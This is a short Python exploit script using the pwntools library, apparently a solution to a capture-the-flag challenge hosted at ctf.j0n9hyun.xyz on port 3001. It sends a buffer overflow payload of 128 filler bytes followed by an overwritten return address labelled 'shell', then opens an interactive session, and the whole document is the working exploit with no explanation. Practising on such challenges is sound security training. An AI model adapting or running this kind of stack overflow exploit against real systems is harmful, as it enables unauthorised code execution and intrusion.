from pwn import *

p=remote("ctf.j0n9hyun.xyz", 3001)

shell=0x0804849b
payload='A'*128+p32(shell)

p.sendline(payload)
p.interactive()
